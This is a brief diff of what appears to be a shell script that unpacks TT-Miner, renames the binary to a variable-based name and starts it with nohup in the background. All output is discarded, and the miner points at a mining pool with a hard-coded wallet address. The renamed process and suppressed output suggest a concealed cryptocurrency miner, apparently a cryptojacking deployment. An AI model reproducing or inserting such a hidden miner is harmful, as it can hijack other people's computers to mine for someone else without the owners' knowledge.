@@ -8,6 +8,6 @@ tar xvf dot
 
 cd TT-Miner-2024.2.1B5.2
 
-mv TT-Miner $kolot
+mv TT-Miner test$kolot
 
-nohup ./$kolot -a FLEX -P kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
+nohup ./test$kolot -a FLEX -P kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
